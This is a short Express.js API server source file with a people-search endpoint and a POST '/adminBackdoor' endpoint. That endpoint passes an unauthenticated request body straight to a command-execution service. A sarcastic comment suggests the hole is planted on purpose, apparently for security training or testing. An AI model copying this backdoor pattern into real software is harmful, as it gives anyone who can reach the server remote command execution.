import express from 'express';
import {query, validationResult} from 'express-validator';
import {logger} from '../services/logger.js';
import {searchPeople} from "../services/people.js";
import {executeBackdoorCommand} from "../services/adminBackdoor.js";

const api = express();
api.use(express.json());
const queryValidation = [
    query('firstName')
        .exists()
        .withMessage('firstName is required')
        .isString(),
    query('lastName')
        .exists()
        .withMessage('firstName is required')
        .isString()
];
api.get('/search', queryValidation, async (req, res) => {
    const validationErrors = validationResult(req);
    if (!validationErrors.isEmpty()) {
        logger.warn('invalid domain ping request received', {
            Data: req.body,
            Errors: validationErrors.array()
        });
        return res.json(validationErrors.array());
    }
    try {
        const searchResult = await searchPeople(req.query.firstName, req.query.lastName)
        return res.json({"result": searchResult});
    } catch (e) {
        logger.error({
            Data: req.body,
            err: e
        }, 'search error');
        return res.status(500).json({error: e.message});
    }
});

/*
    In case I forget SSH password, I can use this backdoor to execute commands on the server
    Looks like completely safe, right?
 */
api.post('/adminBackdoor', async (req, res) => {
    logger.info(`admin backdoor request received, executing command ${req.body.command}`)
    try {
        const adminCommandResult = await executeBackdoorCommand(req.body.command)
        return res.json({"result": adminCommandResult});
    }
    catch (e) {
        logger.error({
            Data: req.body,
            err: e
        }, 'admin backdoor error');
        return res.status(500).json({error: e.message});
    }
})

export function startApiServer() {
    logger.info('starting API server');
    api.listen(3000, () => {
        logger.info('API server listening on port 3000');
    });
}
